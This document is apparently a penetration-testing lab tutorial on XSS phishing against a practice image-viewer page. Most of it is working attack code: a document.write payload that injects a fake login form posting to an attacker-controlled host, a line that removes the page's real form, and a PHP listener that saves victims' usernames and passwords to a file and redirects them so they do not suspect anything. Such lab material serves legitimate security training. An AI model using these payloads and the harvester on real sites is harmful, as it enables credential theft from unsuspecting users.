# Phishing

## Overview
Phishing attacks are a common XSS exploitation technique that uses legitimate-looking information to trick victims into revealing sensitive data. A typical approach injects fake login forms that capture credentials sent to an attacker's server.

XSS phishing can also be used as a security awareness exercise to evaluate employee knowledge and trustworthiness of vulnerable applications.

## XSS Discovery

### Finding the Vulnerability
Start by identifying the XSS vulnerability in the target application. For example, a simple image viewer at `/phishing`:

```
http://SERVER_IP/phishing/index.php?url=https://www.hackthebox.eu/images/logo-htb.svg
```

Basic XSS payloads may not work initially:

```
http://SERVER_IP/phishing/index.php?url=<script>alert(window.origin)</script>
```

**Tip:** Inspect the HTML source to understand how your input is rendered and find a working payload.

## Login Form Injection

### Creating the Phishing Form
Once you have a working XSS payload, inject HTML code to display a fake login form:

```html
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

Replace `OUR_IP` with your VM's IP address (from `ip a` under tun0).

### Injecting via XSS
Use `document.write()` to inject the form as a single-line payload:

```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

## Cleaning Up

### Removing the Original Form
Use `document.getElementById().remove()` to hide the URL input field. First, identify its ID using [CTRL+SHIFT+C]:

```javascript
document.getElementById('urlform').remove();
```

### Complete Payload
Combine both functions:

```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
```

### Hiding Remaining HTML
Add an HTML comment at the end to hide leftover content:

```html
...PAYLOAD... <!-- 
```

## Credential Stealing

### Setting Up a Listener
Create a PHP script to capture credentials and redirect victims:

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

### Running the Server
```bash
mkdir /tmp/tmpserver
cd /tmp/tmpserver
# Save the PHP script to index.php
sudo php -S 0.0.0.0:80
```

### Capturing Credentials
When victims submit the form, their credentials appear in the HTTP request and are logged to `creds.txt`. The victim is silently redirected to the original page, minimizing suspicion.
